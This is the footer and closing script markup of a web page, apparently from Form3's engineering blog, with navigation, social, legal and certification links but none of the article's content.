          </h5> <img src="/_nuxt/img/chevron-down-20px-dark.2c1d915.svg" alt="chevron-down-20px-dark" class="ml-2 -rotate-180"></div> <div><ul class="leading-9"><li><a href="/why-form3/approach">
                Our approach
              </a></li> <li><a href="/why-form3/about-us/team">
                Our team
              </a></li> <li><a href="/careers/vacancies">
                Vacancies
                <!----></a></li></ul></div></div> <ul><li><h5 class="w-full mb-4 cursor-pointer lg:w-auto lg:cursor-auto">
            Follow our journey
          </h5></li> <li class="flex py-2"><a href="https://www.linkedin.com/company/form3-financial-cloud" target="_blank" data-social-follow="" class="mr-6 linkedin"><img src="/_nuxt/img/linkedin-line-dark.04daa3c.svg" alt="linkedin-line-dark" class="select-none"></a> <a href="https://twitter.com/Form3Cloud" target="_blank" data-social-follow="" class="mr-6 twitter"><img src="/_nuxt/img/twitter-line-dark.3d5eff8.svg" alt="twitter-line-dark" class="select-none"></a> <a href="https://www.youtube.com/channel/UC4JFqvsqAwXjS-X7WLINFOw/videos" target="_blank youtube" data-social-follow="" class="mr-6"><img src="/_nuxt/img/youtube-line-dark.c7bad6c.svg" alt="youtube-line-dark" class="select-none"></a> <a href="https://www.instagram.com/form3.tech" target="_blank" data-social-follow="" class="mr-6 instagram"><img src="/_nuxt/img/instagram-line-dark.f92ab92.svg" alt="instagram-line-dark" class="select-none"></a></li></ul></div> <div class="flex flex-col gap-6 py-10 lg:flex-row"><ul class="flex flex-col flex-wrap pb-10 leading-5 lg:leading-9 lg:pb-0 gap-y-5 gap-x-6 lg:flex-row"><li class="whitespace-nowrap"><a href="/legal/terms-and-conditions">
            Terms & Conditions
          </a></li> <li class="whitespace-nowrap"><a href="/legal/data-privacy-statement">
            Privacy Policy
          </a></li> <li class="whitespace-nowrap"><a href="/legal/recruitment-data-policy">
            Recruitment Data Policy
          </a></li> <li class="whitespace-nowrap"><a href="/legal/modern-slavery">
            Modern Slavery Statement
          </a></li> <li class="whitespace-nowrap"><a href="/legal/license"> Licence </a></li> <li class="whitespace-nowrap"><a href="/legal/cookie-policy">Cookie Policy</a></li> <li class="whitespace-nowrap"><button>Manage Cookies</button></li></ul> <ul class="flex flex-row justify-between flex-grow gap-8 leading-9 lg:justify-end"><li class="whitespace-nowrap"><img src="/_nuxt/img/aws-partner-icon-dark.3ec7b9c.svg" alt="aws-partner-icon-dark" class="inline-block max-w-none"></li> <li class="whitespace-nowrap"><span> ISO 27001 </span> <span class="ml-6"> ISO 22301 </span></li></ul></div></div></footer> <!----> <!----></div></div></div><script defer src="/_nuxt/static/1668689593/engineering/content/bypassing-ebpf-tools/state.js"></script><script src="/_nuxt/4f3bf05.js" defer></script><script src="/_nuxt/2e68dcf.js" defer></script><script src="/_nuxt/8e88736.js" defer></script><script src="/_nuxt/61e5ba1.js" defer></script><script src="/_nuxt/a46b515.js" defer></script><script src="/_nuxt/aac95b7.js" defer></script><script src="/_nuxt/baa2b20.js" defer></script><script src="/_nuxt/4639459.js" defer></script><script src="/_nuxt/0c1f518.js" defer></script><script src="/_nuxt/ceec652.js" defer></script><script src="/_nuxt/25bc68b.js" defer></script><script src="/_nuxt/26424a3.js" defer></script><script src="/_nuxt/557b52d.js" defer></script><script src="/_nuxt/76c5e1d.js" defer></script>
  </body>
</html>
